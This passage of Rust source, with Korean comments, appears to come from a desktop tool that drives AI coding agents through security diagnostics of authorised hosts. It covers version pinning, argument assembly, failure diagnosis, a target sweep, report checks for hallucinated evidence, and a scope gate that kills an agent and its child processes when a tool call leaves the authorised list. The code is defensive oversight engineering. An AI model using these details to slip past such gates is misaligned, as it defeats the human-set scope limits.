            Ok(None) => {}
            Err(_) => return fail(),
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
        waited += 100;
        if waited > 3000 {
            let _ = child.kill();
            return fail();
        }
    }
}

/// 엔진 버전 핀 — `redcell-desktop/engines.json`이 단일 출처 (업스트림 추적).
/// `REDCELL_ENGINES_JSON` 환경변수로 파일 경로를 오버라이드할 수 있다.
/// 새 pi/prime-agent 릴리스 적용 절차는 `redcell-desktop/docs/ENGINE_UPGRADE.md`.
const ENGINES_JSON_EMBED: &str = include_str!("../../engines.json");

fn engines_doc() -> Value {
    if let Ok(p) = std::env::var("REDCELL_ENGINES_JSON") {
        if let Ok(t) = fs::read_to_string(p.trim()) {
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                return v;
            }
        }
    }
    serde_json::from_str(ENGINES_JSON_EMBED).unwrap_or(Value::Null)
}

fn engine_pin(engine: &str, key: &str, fallback: &str) -> String {
    engines_doc()
        .get(engine)
        .and_then(|e| e.get(key))
        .and_then(|v| v.as_str())
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| fallback.to_string())
}

/// 앱이 요구하는 pi 버전 — 이보다 낮으면 앱 전용 폴더에 고정 버전을 설치해 쓴다.
fn pi_pinned_version() -> String {
    engine_pin("pi", "pinned", "1.4.0")
}
fn pi_min_version() -> String {
    engine_pin("pi", "min", "1.4.0")
}
fn prime_pinned_version() -> String {
    engine_pin("prime_agent", "pinned", "0.10.0")
}
fn prime_min_version() -> String {
    engine_pin("prime_agent", "min", "0.10.0")
}

/// 앱 전용 pi 설치 위치 — 시스템 전역 pi 를 건드리지 않는다.
fn managed_pi_dir() -> Option<PathBuf> {
    user_home().map(|h| h.join(".redcell").join("pi"))
}

/// "pi 1.4.0" / "1.4.0" / "v1.4.0-beta" → (1,4,0).
fn parse_semver(s: &str) -> Option<(u32, u32, u32)> {
    let tok = s.split_whitespace().find(|t| t.chars().any(|c| c.is_ascii_digit()) && t.contains('.'))?;
    let core = tok.trim_start_matches('v').split(|c| c == '-' || c == '+').next()?;
    let mut it = core.split('.').map(|p| p.parse::<u32>().ok());
    Some((it.next()??, it.next()??, it.next().flatten().unwrap_or(0)))
}

fn pi_version_at_least(found: &str, min: &str) -> bool {
    match (parse_semver(found), parse_semver(min)) {
        (Some(f), Some(m)) => f >= m,
        _ => true, // 버전을 읽지 못하면 건드리지 않는다.
    }
}

/// `npm install --prefix ~/.redcell/pi @earendil-works/pi-coding-agent@<고정버전>` (최대 5분).
fn install_managed_pi() -> Result<(), String> {
    let dir = managed_pi_dir().ok_or("홈 디렉터리를 찾을 수 없습니다.")?;
    fs::create_dir_all(&dir).map_err(|e| format!("설치 폴더 생성 실패: {e}"))?;
    let npm = first_on_path(if cfg!(windows) { "npm.cmd" } else { "npm" })
        .ok_or("npm 을 PATH 에서 찾을 수 없습니다 — Node.js 설치를 확인하세요.")?;
    let spec = format!("@earendil-works/pi-coding-agent@{}", pi_pinned_version());
    let mut cmd = if cfg!(windows) {
        let comspec = std::env::var_os("COMSPEC").unwrap_or_else(|| "cmd.exe".into());
        let mut c = Command::new(comspec);
        c.arg("/C").arg(&npm);
        c
    } else {
        Command::new(&npm)
    };
    cmd.arg("install").arg("--prefix").arg(&dir).arg(&spec).args(["--no-audit", "--no-fund", "--ignore-scripts"]);
    hide_window(&mut cmd);
    let mut child = cmd
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("npm 실행 실패: {e}"))?;
    let mut waited = 0u64;
    loop {
        if let Some(st) = child.try_wait().map_err(|e| e.to_string())? {
            if st.success() {
                return Ok(());
            }
            let mut err = String::new();
            if let Some(mut o) = child.stderr.take() {
                use std::io::Read;
                let _ = o.read_to_string(&mut err);
            }
            let tail: String = err.trim().lines().rev().take(3).collect::<Vec<_>>().into_iter().rev().collect::<Vec<_>>().join(" / ");
            return Err(format!("npm install 실패: {tail}"));
        }
        std::thread::sleep(std::time::Duration::from_millis(500));
        waited += 500;
        if waited > 300_000 {
            let _ = child.kill();
            return Err("npm install 시간 초과 (5분) — 네트워크·사내 npm 레지스트리 설정을 확인하세요.".into());
        }
    }
}

/// 정밀 진단 시작 전 pi 버전 보장 — 고정 버전보다 낮으면 앱 전용 폴더에 설치한다.
/// 실패해도 진단은 기존 pi 로 계속 시도한다(수동 설치 명령만 안내).
fn ensure_pinned_pi(app: &AppHandle, id: &str, settings: &Settings) {
    let ver = pi_cli_version(settings);
    let pinned = pi_pinned_version();
    if pi_version_at_least(&ver, &pinned) {
        return;
    }
    emit_note(
        app,
        id,
        format!("[sys] pi {ver} 는 구버전입니다 — 앱 전용 폴더(~/.redcell/pi)에 pi {pinned} 을 설치합니다 (최초 1회, 1~2분)."),
        None,
    );
    match install_managed_pi() {
        Ok(()) => emit_note(app, id, format!("[sys] pi {} 사용", pi_cli_version(settings)), None),
        Err(e) => emit_note(
            app,
            id,
            format!(
                "[sys] pi {pinned} 자동 설치 실패 — {e}\n수동 설치: npm i -g @earendil-works/pi-coding-agent@{pinned}"
            ),
            None,
        ),
    }
}

/// 정밀 진단 시작 전 prime-agent 버전 확인 — 최소 버전보다 낮으면 경고를 남긴다.
/// prime 은 npm managed 설치 경로가 없어(릴리스 바이너리) 자동 설치는 하지 않고,
/// 업그레이드 안내만 한다. 실패해도 진단은 계속 시도한다.
fn warn_stale_prime(app: &AppHandle, id: &str) {
    let bin = match prime_agent_path() {
        Ok(b) => b,
        Err(_) => return, // 미설치 — prime 엔진을 고를 때 별도 안내
    };
    let ver = prime_version(&bin).unwrap_or_else(|| "미확인".to_string());
    let min = prime_min_version();
    if !pi_version_at_least(&ver, &min) {
        emit_note(
            app,
            id,
            format!(
                "[sys] 주의: prime-agent {ver} 는 최소 요구({min})보다 낮습니다 — 구버전에서는 세션 연속·모델 인식이 다르게 동작할 수 있습니다. 최신 릴리스로 교체를 권장합니다 (https://github.com/PrimeIntellect-ai/prime-agent/releases)."
            ),
            None,
        );
    }
}

/// 핑 실패 원인 분류 — pi 를 거치지 않는 직통 최소 요청(연결 테스트와 동일 경로)으로
/// 계층을 가린다. "400 (no body)" 처럼 본문 없는 오류는 원인이 안 보이므로, 같은
/// 엔드포인트에 앱이 직접 1토큰을 쏴서 어디가 거부했는지 한 줄로 판정한다:
///   직통 OK  → 엔드포인트·키·모델 정상, pi 엔진 경로(버전/프록시/헤더) 문제
///   401/403  → 키 문제 (토큰 재발급 안내)
///   그 외    → 엔드포인트/네트워크 문제 (게이트웨이 본문이 있으면 그대로 노출)
fn classify_ping_failure(settings: &Settings, provider: &str, ping_error: &str) -> String {
    let conn = settings.providers.get(provider).cloned().unwrap_or_default();
    let key = conn.api_key.trim().to_string();
    let mut lines = vec![format!("핑 오류: {ping_error}")];
    // prime-agent 계약 파손 (0.10 실측): --api-key 를 무시하고 모델을 못 찾는다.
    if ping_error.contains("No models available") {
        lines.push(
            "원인: prime-agent 가 모델을 찾지 못했습니다 — prime 은 --api-key 플래그를 무시합니다. 설정(⚙) > 프로바이더에서 이 카드를 다시 저장해 ~/.prime/agent/models.json 을 동기화하고, 모델명이 정확한지 확인하세요. (custom/ollama·lge-aigw 는 카드 저장이 필수입니다)".into(),
        );
        return lines.join("\n");
    }
    if key.is_empty() {
        lines.push(
            "원인: API 키 미설정 — 설정(⚙) > 프로바이더 > 이 카드에 토큰을 붙여넣고 연결 저장을 누르세요.".into(),
        );
        return lines.join("\n");
    }
    let base = sync_base_url(provider, &conn);
    let api = sync_api(provider, &conn);
    let ver = pi_cli_version(settings);
    match probe_provider_endpoint(provider, &key, &base, &api, &conn.model) {
        Ok(line) => {
            lines.push(format!(
                "분류: 엔드포인트 직통 요청은 성공({line}) — 키·모델·API 방식 모두 정상입니다."
            ));
            // thinking-only 모델이 pi 의 reasoning 필드를 거부한 경우 — 프록시 문제가
            // 아니라 모델 설정 문제이므로 점검 위치를 정확히 안내한다.
            if ping_error.contains("reasoning_effort") || ping_error.contains("thinking-only") {
                lines.push(
                    "→ thinking-only 모델이 pi 요청의 reasoning.effort 값을 거부했습니다. 앱 실행 시 모델 설정(models.json)이 자동 보정되지만, 이 오류가 반복되면 ~/.pi/agent/models.json(prime-agent는 ~/.prime/agent/models.json)의 해당 모델 항목에 `reasoning:true`·`thinkingLevelMap` 잔재가 없는지 확인하세요.".into(),
                );
            } else {
                lines.push(format!(
                    "→ pi 엔진({ver})의 요청만 거부됐습니다. pi 버전이 오래됐거나(재설치 권장), 사내 프록시/보안 장비가 pi 요청의 특정 헤더·필드를 걸러내는 것일 수 있습니다 — 프록시 차단 로그를 확인하세요."
                ));
            }
        }
        Err(e) if e.contains("401") || e.contains("403") => {
            lines.push(format!(
                "분류: 엔드포인트가 키를 거부했습니다({e}) — 토큰이 만료됐을 수 있습니다. 터미널 `ug auth-token` 출력을 다시 카드에 붙여넣으세요."
            ));
        }
        Err(e) => {
            lines.push(format!("분류: 엔드포인트 직통 요청도 실패 — {e}"));
            lines.push(
                "→ base URL·API 방식을 점검하세요. 오류 본문이 비어 있다면 중간 프록시/네트워크 차단일 확률이 높습니다.".into(),
            );
        }
    }
    lines.join("\n")
}

/// 펌프+대기 — 등록된 자식을 펌핑하고 제거·대기한 뒤 outcome 을 확정한다.
/// 레지스트리에 없으면(중지됨) aborted 로 마감한다.
fn pump_and_wait(
    app: &AppHandle,
    id: &str,
    proc_key: &str,
    pipes: PiPipes,
    worker: Option<WorkerTag>,
    tool_prefix: &str,
    enforce_auth: Option<auth::AuthList>,
    report_tag: Option<&str>,
) -> PumpOutcome {
    let enforce = enforce_auth.map(|auth| ScopeEnforce { proc_key: proc_key.to_string(), auth });
    let mut oc = pump_pi_stdio(app, id, pipes, worker, tool_prefix, enforce, report_tag);
    match app.state::<Procs>().0.lock().unwrap().remove(proc_key) {
        Some(mut c) => {
            if !c.wait().map(|st| st.success()).unwrap_or(false) {
                oc.failed = true;
            }
            oc
        }
        None => {
            oc.aborted = true;
            oc
        }
    }
}

/// 단일 실행 마감 — 완료 노트 + 상태 전이 (실행 중일 때만).
fn finalize_run(app: &AppHandle, id: &str, outcome: &PumpOutcome, engine_label: &str) {
    let ok = (!outcome.failed && !outcome.aborted) || has_usable_text(outcome);
    // 실패 원인 한 줄 — 어느 프로바이더/모델이 거부했는지와 점검 경로를 함께 보여준다.
    let err_hint = if ok || outcome.aborted || outcome.blocked {
        String::new()
    } else {
        let p = read_session(app, id).map(|s| s.provider).unwrap_or_default();
        let model = get_settings(app.clone())
            .providers
            .get(p.trim())
            .map(|c| c.model.trim().to_string())
            .unwrap_or_default();
        let model_part = if model.is_empty() { String::new() } else { format!("/ {model}") };
        let detail = if outcome.error.is_empty() { String::new() } else { format!(" 마지막 오류: {}", outcome.error) };
        let prime_hint = if engine_label == "prime-agent" && outcome.error.contains("No models available") {
            " prime-agent 는 --api-key 를 무시하므로, 설정(⚙) > 프로바이더에서 카드를 다시 저장해 모델 목록을 동기화하세요."
        } else {
            ""
        };
        format!(
            " — AI 모델 '{p}'{model_part} 연결을 점검하세요 (설정(⚙) > 모델 연결에서 연결 테스트).{detail}{prime_hint}"
        )
    };
    let ev2 = json!({ "type": "note", "text": if outcome.aborted {
        format!("[중지] {engine_label} 실행이 중단됐습니다.")
    } else if outcome.blocked {
        format!("[차단] 허용 범위를 벗어나 {engine_label} 실행을 중단했습니다 — 점검 대상 관리에서 주소를 확인하세요.")
    } else if ok {
        if is_empty_success(outcome) {
            format!("[완료] {engine_label} 종료 — 빈 응답: AI가 글을 돌려주지 않았습니다(모델·게이트웨이 응답 확인).")
        } else if outcome.failed {
            format!("[완료] {engine_label} 종료 — 결과 탭에서 확인하세요. (응답 끝부분이 잘렸을 수 있습니다)")
        } else {
            format!("[완료] {engine_label} 종료.")
        }
    } else {
        format!("[완료] {engine_label} 비정상 종료{err_hint}")
    }});
    let stamped = append_event(app, id, &ev2);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    if let Some(cur) = read_session(app, id) {
        if cur.status == "running" {
            let st = if ok { "done" } else { "error" };
            set_status(app, id, st);
            app.emit("engagement-status", json!({ "sessionId": id, "status": st })).ok();
        }
    }
}

/// 단일 턴(비병합) 진단 마감 — 리포트 자동 저장 + 기계 대조 결과 노트.
/// 심층 경로와 달리 병합 단계가 없다 — 그래서 **자동 수정은 하지 않는다.**
/// 검증 결과(확인/불일치/미시도·환각 P-ID)를 정직하게 노트로만 노출하고,
/// 원문은 사용자가 확인·수정할 수 있도록 그대로 둔다.
fn finalize_single_turn_report(
    app: &AppHandle,
    id: &str,
    outcome: &PumpOutcome,
    evidence: &HashMap<String, String>,
    cookie: &str,
) {
    // 일반 채팅 세션은 대상이 아니다 — 리포트 저장·대조는 진단 세션에서만.
    let diag = read_session(app, id).map(|s| s.diag).unwrap_or(false);
    if !diag {
        return;
    }
    let text = outcome.text.trim();
    if text.is_empty() {
        return;
    }
    // 발행 파일 자동 저장 — 실패는 한 줄로 알리고 무시한다(실행 자체를 막지 않는다).
    if let Err(e) = write_report_file(&reports_dir(app), id, "final", text) {
        emit_note(
            app,
            id,
            format!("[sys] 리포트 자동 저장 실패({e}) — 결과 탭에서 MD로 저장하세요."),
            None,
        );
    }
    // 기계 대조 — 환각 [P-###] 인용과 근거 없는 [실증] 표기, 그리고 위험도 과대 주장을 잡아낸다.
    // (심층 경로와 동일한 검증기를 쓴다 — 근거 맵은 P-ID → 엔진 심각도.)
    let vauth = auth::load(&resolve_app_auth_path(app));
    let rep = verify_report_claims(text, evidence, &vauth, cookie);
    emit_note(app, id, verify_note_line(&rep), None);
    emit_note(
        app,
        id,
        "[sys] 단일 턴 진단은 병합 단계가 없어 대조 결과만 알려줍니다 — 불일치·환각 인용은 자동 수정되지 않습니다(리포트 원문을 확인하세요).".to_string(),
        None,
    );
}

/// prime-agent 단일 턴 — 스코프 스킬 주입 + 반응형 킬게이트 + 세션 dir 연속대화.
/// prime-agent 대화 연속성 — 0.10 은 --session-dir 에 저장하지 않고 --continue 가
/// 새 세션을 발급하는 것으로 실측됐다. 대신 앱이 보관한 채팅 기록(최근 6개·3000자)을
/// 지시문 앞에 인계 블록으로 붙여 무상태 연속 대화를 보장한다 (pi 엔진은 네이티브
/// --session-id 를 쓰므로 이 경로를 타지 않는다).
fn prime_carry_context(app: &AppHandle, id: &str) -> String {
    let s = match read_session(app, id) {
        Some(s) => s,
        None => return String::new(),
    };
    let turns: Vec<String> = s
        .chat
        .iter()
        .filter(|m| m.role == "user" || m.role == "assistant")
        .rev()
        .take(6)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .map(|m| {
            let who = if m.role == "user" { "사용자" } else { "어시스턴트" };
            let body: String = m.content.chars().take(800).collect();
            format!("- {who}: {body}")
        })
        .collect();
    if turns.is_empty() {
        return String::new();
    }
    let joined = turns.join("\n");
    let clipped: String = joined.chars().take(3000).collect();
    format!("## 이전 대화 인계 (같은 작업의 앞부분 — 이어서 답하라)\n{clipped}")
}

fn run_prime_agent(
    app: &AppHandle,
    id: &str,
    s: &Session,
    settings: &Settings,
    provider: &str,
) -> Result<(), String> {
    let run_start = std::time::SystemTime::now();
    let mut instruction = turn_instruction(app, s, Engine::Prime);
    // 단일 진단 모드에서도 P0 스윕 증거를 주입 (대상이 있을 때만).
    // 스윕 히트 id 는 기계 대조(verify_report_claims)의 유효 P-ID 목록이 된다.
    // 기계 대조 입력 — P-ID → 엔진 심각도(seriousness audit 가 '주장 위험도 ↔ 근거 최대 심각도'
    // 를 비교한다). 맵의 키 집합이 곧 유효 P-ID 목록이다.
    let mut sweep_ids: HashMap<String, String> = HashMap::new();
    if s.diag && !s.host.trim().is_empty() {
        let sweep = run_p0_sweep(app, id, &s.host, s.port, &s.auth_cookie, s.danger_consent);
        sweep_ids = sweep.hits.iter().map(|h| (h.id.clone(), h.severity.clone())).collect();
        instruction.push_str(&p0_evidence_block(&sweep, 6000));
    }
    // prime 무상태 연속 대화 — 앞 턴 기록이 있으면 인계 블록을 앞에 붙인다.
    let carry = prime_carry_context(app, id);
    if !carry.is_empty() {
        instruction = format!("{carry}\n\n{instruction}");
        let ev = json!({ "type": "note", "text": "[sys] prime-agent 연속 대화 — 이전 대화 맥락을 인계했습니다." });
        let stamped = append_event(app, id, &ev);
        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    }

    let ev3 = json!({ "type": "note", "text": "[sys] 안전장치: prime-agent 의 모든 동작을 점검 대상 목록으로 검사하고 벗어나면 중단합니다(이번 작업만)." });
    let stamped3 = append_event(app, id, &ev3);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped3 })).ok();

    // 동기 프리플라이트 — 바이너리 미설치면 즉시 Err.
    prime_agent_path()?;
    {
        let ev = json!({ "type": "note", "text": "[sys] prime-agent 엔진으로 실행합니다." });
        let stamped = append_event(app, id, &ev);
        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    }

    let prep = prepare_engine_run(app, id, Engine::Prime, settings, provider, "", "main", instruction, false)?;
    let (child, pipes) = spawn_prepared(&prep, provider, settings)?;
    app.state::<Procs>().0.lock().unwrap().insert(id.to_string(), child);
    set_status(app, id, "running");
    app.emit("engagement-status", json!({ "sessionId": id, "status": "running" })).ok();

    {
        let app = app.clone();
        let id = id.to_string();
        let prefix = prep.tool_prefix;
        let auth = prep.enforce_auth;
        // 진단 세션만 리포트 표식("final")을 붙인다 — 일반 채팅은 노트로 방출된다.
        let report_tag: Option<&'static str> = if s.diag { Some("final") } else { None };
        let cookie = s.auth_cookie.clone();
        thread::spawn(move || {
            let outcome = pump_and_wait(&app, &id, &id, pipes, None, prefix, auth, report_tag);
            finalize_run(&app, &id, &outcome, "prime-agent");
            finalize_single_turn_report(&app, &id, &outcome, &sweep_ids, &cookie);
            audit_prime_homes(&app, &id);
            audit_temp_window(&app, &id, run_start);
        });
    }
    Ok(())
}

/// 긴 지시문의 argv 상한 — 이 바이트를 넘으면 temp 파일로 빼고 `@경로` 를 넘긴다.
/// Windows CreateProcess 는 명령줄 전체가 32767자까지라, collector 지시문(워커 5개분+
/// 스펙+P0 증거, 수만 자)을 `-p` 로 넘기면 os error 206 으로 스폰 자체가 실패한다.
/// pi·prime-agent 모두 `@file` 을 첫 프롬프트로 읽는다(실측: `-p` 값·위치 인자 동일).
const PROMPT_SPILL_BYTES: usize = 12_000;

/// 상한 초과 시 지시문을 temp 파일에 쓰고 `@절대경로` 를 돌려준다. 미만이면 None
/// (원문 argv 유지). 쓰기 실패 시도 None 으로 폴백한다 (기존 동작과 동일).
/// 파일은 OS temp 정리에 맡긴다 — pi 가 시작 후 비동기로 읽으므로 스폰 직후 지우면 안 된다.
fn spill_prompt_to_file(tag: &str, instruction: &str) -> Option<String> {
    if instruction.len() <= PROMPT_SPILL_BYTES {
        return None;
    }
    let safe: String = tag
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() || c == '-' { c } else { '_' })
        .collect();
    let path = std::env::temp_dir().join(format!("redcell-prompt-{safe}.md"));
    fs::write(&path, instruction).ok()?;
    Some(format!("@{}", path.to_string_lossy()))
}

/// pi print 인자 조립 — run_prime·deep 워커·collector 공용.
/// (models.json 동기화 포함. pi 1.3.0 플래그: -e/--mode/--session-id/-p/--provider/--model/--api-key)
fn pi_cli_args(
    settings: &Settings,
    provider: &str,
    redcell: &str,
    piq: &str,
    instruction: String,
) -> Result<(PathBuf, Vec<String>, PathBuf), String> {
    let cli = prime_cli_path(redcell)?;
    let ext_path = PathBuf::from(redcell).join("prime-agent").join("index.ts");
    // 긴 지시문(collector 등)은 @파일로 넘긴다 — argv 로 넘기면 Windows 32K 상한(os error 206).
    // run_tag 에는 세션 uuid 가 들어있어 동시 실행 세션끼리 파일이 겹치지 않는다.
    let prompt_arg = spill_prompt_to_file(piq, &instruction).unwrap_or(instruction);
    let mut args: Vec<String> = vec![
        "-e".into(),
        ext_path.to_string_lossy().into_owned(),
        "--mode".into(),
        "json".into(),
        "--session-id".into(),
        piq.to_string(),
        "-p".into(),
        prompt_arg,
    ];
    args.push("--provider".into());
    args.push(provider.to_string());
    let conn = settings.providers.get(provider).cloned().unwrap_or_default();
    // lge-aigw 는 키를 카드에 직접 붙여넣는다 — 비어 있으면 pi 가 placeholder 키로
    // 요청을 보내 401 이 나므로, 실행 전에 붙잡고 붙여넣을 곳을 안내한다.
    if provider == "lge-aigw" && conn.api_key.trim().is_empty() {
        return Err(
            "lge-aigw API 키가 비어 있습니다 — 설정(⚙) > 프로바이더 > lge-aigw 카드에 Databricks 토큰(터미널 `ug auth-token` 출력)을 붙여넣고 연결 저장을 누르세요.".into(),
        );
    }
    // 커스텀/로컬/내장 게이트웨이(pi 기본 카탈로그에 없음): models.json 에 병합해
    // pi 가 프로바이더·키(bang 명령 포함)를 알도록 항상 동기화한다.
    if needs_models_json_sync(provider) {
        let mpath = pi_models_json_path()?;
        sync_pi_models_json_at(&mpath, provider, &sync_base_url(provider, &conn), &conn.api_key, &conn.model, &sync_api(provider, &conn))?;
    }
    // 모델 지정: custom/ollama 도 --model 로 명시( pi 모델 패턴 "provider/id" 또는 순수 id ).
    {
        let m = conn.model.trim().to_string();
        if !m.is_empty() {
            args.push("--model".into());
            args.push(if provider == "custom" || provider == "ollama" { m } else { format!("{provider}/{m}") });
        } else {
            // 모델 미지정 — 카탈로그 기본 모델로 폴백(custom 은 기본이 없다).
            if let Some(d) = PROVIDER_CATALOG.iter().find(|x| x.name == provider) {
                if !d.default_model.is_empty() && provider != "custom" {
                    let d = d.default_model.to_string();
                    args.push("--model".into());
                    args.push(if needs_models_json_sync(provider) { d } else { format!("{provider}/{d}") });
                }
            }
        }
    }
    // 키: CLI --api-key 가 pi 해석 1순위(GUI 환경에선 env 가 안 보일 수 있어 가장 확실).
    // 단 `!명령` 키(pi !command)는 models.json 에만 살고 CLI 로 넘기지 않는다.
    if !conn.api_key.trim().is_empty() && !conn.api_key.trim_start().starts_with('!') {
        args.push("--api-key".into());
        args.push(conn.api_key.trim().to_string());
    }
    Ok((cli, args, prime_cwd(redcell)))
}

struct PiPipes {
    out: BufReader<ChildStdout>,
    err: BufReader<ChildStderr>,
}

/// 엔진 자식 프로세스 스폰 — REDCELL_GATE=1 + 프로바이더 env 주입 (+ 추가 env).
fn launch_child(
    prog: &Path,
    args: &[String],
    cwd: &Path,
    provider: &str,
    settings: &Settings,
    extra_env: &[(&str, &str)],
    err_hint: &str,
) -> Result<(Child, PiPipes), String> {
    let mut cmd = Command::new(prog);
    #[cfg(unix)]
    {
        // 자식을 프로세스 그룹 리더로 — kill_engine_child 가 자손까지 정리한다.
        use std::os::unix::process::CommandExt;
        cmd.process_group(0);
    }
    cmd.current_dir(cwd);
    cmd.args(args);
    // 인가 게이트 명시 활성화: pi 확장의 tool_call 훅이 이 세션에서만 fail-closed 로 동작한다.
    cmd.env("REDCELL_GATE", "1");
    for (k, v) in extra_env {
        cmd.env(k, v);
    }
    if let Some(conn) = settings.providers.get(provider) {
        inject_provider_env(&mut cmd, provider, conn);
    }
    hide_window(&mut cmd);
    let mut child = cmd
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("{err_hint}: {e}"))?;
    let out = child.stdout.take().map(BufReader::new).ok_or("stdout 파이프 실패")?;
    let err = child.stderr.take().map(BufReader::new).ok_or("stderr 파이프 실패")?;
    Ok((child, PiPipes { out, err }))
}

/// 엔진 자식 + 자손 전체 종료 — 위반 차단·중지·프리플라이트 초과 시 쓴다.
/// 단일 kill 이면 고아가 된 curl·python 자식이 탈취를 완수할 수 있어, Unix 에서는
/// launch_child 가 지정한 프로세스 그룹 전체에 SIGTERM(1.5초 내 미종료 시 SIGKILL)을
/// 보낸다. setsid 로 그룹을 이탈한 자손은 남을 수 있다(잔여 한계).
/// 반드시 launch_child 경유 자식(그룹 리더)에만 쓸 것 — 그 외 단발 프로브는 plain kill.
fn kill_engine_child(child: &mut Child) {
    #[cfg(unix)]
    {
        // 이미 끝났으면 그룹 시그널을 보내지 않는다 (pid 재사용 오폭 방지).
        if child.try_wait().ok().flatten().is_some() {
            return;
        }
        let pgid = child.id() as i32;
        unsafe {
            libc::killpg(pgid, libc::SIGTERM);
        }
        let start = std::time::Instant::now();
        while start.elapsed() < std::time::Duration::from_millis(1500) {
            match child.try_wait() {
                Ok(Some(_)) => return,
                _ => std::thread::sleep(std::time::Duration::from_millis(100)),
            }
        }
        unsafe {
            libc::killpg(pgid, libc::SIGKILL);
        }
        let _ = child.wait();
    }
    #[cfg(not(unix))]
    {
        // Windows: taskkill /T (트리) 우선, 실패 시 단일 kill. macOS 는 단일 kill(잔여).
        #[cfg(windows)]
        {
            let args = taskkill_tree_args(child.id());
            let tk = Command::new("taskkill").args(&args).output();
            if tk.map(|o| o.status.success()).unwrap_or(false) {
                let _ = child.wait();
                return;
            }
        }
        let _ = child.kill();
    }
}

/// taskkill 트리 종료 인자 — /PID <pid> /T /F.
#[cfg_attr(not(windows), allow(dead_code))]
fn taskkill_tree_args(pid: u32) -> Vec<String> {
    vec!["/PID".to_string(), pid.to_string(), "/T".to_string(), "/F".to_string()]
}


/// 정밀 진단 분야 태그 — 이벤트에 worker id 를 찍고 UI 칩과 연결한다.
#[derive(Clone)]
struct WorkerTag {
    id: String,
    label: String,
}

/// 노트 1건 저장 + 프론트 전송 (워커 태그가 있으면 접두 + worker 필드).
fn emit_note(app: &AppHandle, id: &str, text: String, worker: Option<&WorkerTag>) {
    let ev = match worker {
        Some(w) => json!({ "type": "note", "text": format!("[{}] {}", w.label, text), "worker": w.id }),
        None => json!({ "type": "note", "text": text }),
    };
    let stamped = append_event(app, id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
}

/// 리포트 텍스트 1건 저장 + 프론트 전송 — 병합 결과용.
/// `report` 표식("early"|"final")으로 결과 탭이 1차/최종을 구분한다.
fn emit_report_text(app: &AppHandle, id: &str, text: String, tag: &str) {
    let ev = json!({ "type": "note", "text": text, "report": tag });
    let stamped = append_event(app, id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
}

#[derive(Default)]
#[allow(dead_code)] // settled: 프로토콜 완성도용 플래그 (완료 판정은 failed/aborted+exit)
struct PumpOutcome {
    text: String, // 어시스턴트 텍스트 전체 누적 (워커 발견·collector 입력용)
    failed: bool, // stopReason=error / exit≠0 계열
    aborted: bool, // stopReason=aborted / settled(aborted) / 중지 kill
    settled: bool, // agent_settled(pi) / agent_end(prime 0.10) 수신
    blocked: bool, // 반응형 스코프 게이트 발동 (인가 밖 툴 호출로 kill)
    error: String, // 마지막 LLM/실행 오류 메시지 — 사전 점검·마감 안내에 쓴다
}

/// 빈 성공 판정 — stop·exit 0 으로 끝났지만 어시스턴트 텍스트가 하나도 없을 때 true.
/// 상류 안전 필터의 빈 completion·게이트웨이 무응답이 원인이며, 호출자는 실패로 취급하고
/// 원인을 안내해야 한다 (조용히 빈 리포트가 되는 것을 방지).
fn is_empty_success(o: &PumpOutcome) -> bool {
    !o.failed && !o.aborted && o.text.trim().is_empty()
}

/// 부분 성공 판정 하한 (문자) — 이 이상의 텍스트가 있으면 말미 스트림 오류와
/// 무관하게 리포트로 발행한다. 정상 리포트는 수천 자, 오류 부속 문구는 수십 자다.
const MIN_USABLE_CHARS: usize = 500;

/// 부분 성공 — 중단은 아니고(stop 존중) 충분한 텍스트가 있으면 true.
/// 게이트웨이가 응답 말미를 자른 경우(status incomplete 등 pi stopReason=error)에도
/// 확보된 리포트·발견을 살린다.
fn has_usable_text(o: &PumpOutcome) -> bool {
    !o.aborted && o.text.chars().count() >= MIN_USABLE_CHARS
}

/// 반응형 스코프 게이트 — prime-agent 엔진용. tool_execution_start 를 볼 때마다
/// 인가를 판정하고, 위반이면 레지스트리의 자식을 즉시 kill 한다.
#[derive(Clone)]
struct ScopeEnforce {
    proc_key: String,
    auth: auth::AuthList,
}

/// 어시스턴트 텍스트 1건 확정 — 중복 노트 방지 + outcome 누적 + 전송.
fn flush_assistant_text(
    app: &AppHandle,
    id: &str,
    t: &str,
    worker: Option<&WorkerTag>,
    outcome: &mut PumpOutcome,
    last_text: &mut Option<String>,
    report_tag: Option<&str>,
) {
    let t = t.trim().to_string();
    if t.is_empty() || last_text.as_deref() == Some(t.as_str()) {
        return;
    }
    if !outcome.text.is_empty() {
        outcome.text.push_str("\n\n");
    }
    outcome.text.push_str(&t);
    match worker {
        Some(w) => emit_note(app, id, t.clone(), Some(w)),
        None => match report_tag {
            Some(tag) => emit_report_text(app, id, t.clone(), tag),
            None => emit_note(app, id, t.clone(), None),
        },
    }
    *last_text = Some(t);
}

/// tool_execution_end → (실패 여부, " Nms" 접미사).
/// pi: 최상위 isError/durationMs. prime 0.10 실측: 둘 다 없고
/// result.details.status('ok' 외=실패)/durationMs 에 있다.
fn tool_end_status(ev: &Value) -> (bool, String) {
    let det = ev.get("result").and_then(|r| r.get("details"));
    let is_err = ev
        .get("isError")
        .and_then(|v| v.as_bool())
        .unwrap_or_else(|| {
            det.and_then(|d| d.get("status"))
                .and_then(|s| s.as_str())
                .map(|s| s != "ok")
                .unwrap_or(false)
        });
    let dur = ev
        .get("durationMs")
        .or_else(|| det.and_then(|d| d.get("durationMs")))
        .and_then(|v| v.as_u64())
        .map(|ms| format!(" {ms}ms"))
        .unwrap_or_default();
    (is_err, dur)
}

/// tool_execution_end.result → 한 줄 요약 (content 첫 텍스트 우선, 없으면 details).
fn tool_result_summary(ev: &Value) -> String {
    let r = ev.get("result");
    let txt = r
        .and_then(|r| r.get("content"))
        .and_then(|c| c.as_array())
        .and_then(|a| {
            a.iter()
